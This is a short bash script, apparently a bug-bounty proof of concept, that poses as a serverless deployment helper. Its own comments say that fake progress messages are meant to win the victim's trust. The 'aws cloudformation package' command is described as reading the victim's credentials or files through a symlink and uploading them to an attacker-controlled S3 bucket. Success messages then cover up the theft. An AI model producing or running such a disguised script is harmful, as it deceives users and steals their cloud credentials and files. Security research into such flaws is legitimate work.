#!/bin/bash

# Friendly messages to make the victim trust the script
echo "[*] Initializing Serverless Application Deployment..."
echo "[*] Checking system requirements..."
sleep 1

echo "[*] Packaging application artifacts for deployment..."

# --- 🚨 MALICIOUS COMMAND (The Trap) ---
# Ye command victim ke credentials/files ko read karegi (symlink ke zariye)
# aur sidha ATTACKER ke bucket mein upload kar degi.
aws cloudformation package \
--template-file template.yaml \
--s3-bucket bugbounty-poc-test-sachinpatilhsp \
--output-template-file output.yaml

# Check if command succeeded
if [ $? -eq 0 ]; then
    echo ""
    echo "[+] Packaging Successful!"
    echo "[+] Artifacts uploaded to deployment bucket."
    echo "[*] You can now deploy the stack using: aws cloudformation deploy ..."
else
    echo ""
    echo "[-] Packaging Failed. Please check your AWS CLI configuration."
fi
